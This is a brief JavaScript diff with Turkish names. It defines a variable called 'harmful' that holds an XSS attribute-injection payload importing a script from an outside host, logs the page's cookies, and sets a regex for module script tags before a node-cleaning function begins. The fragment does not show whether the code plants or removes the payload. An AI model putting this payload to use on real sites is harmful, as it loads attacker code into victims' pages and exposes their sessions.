@@ -2,7 +2,7 @@ console.log('selam');
 console.log(document.cookie);
 
 (function() {
-  const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');`;
+  const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');"`;
   const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;
 
   function temizleNode(node) {
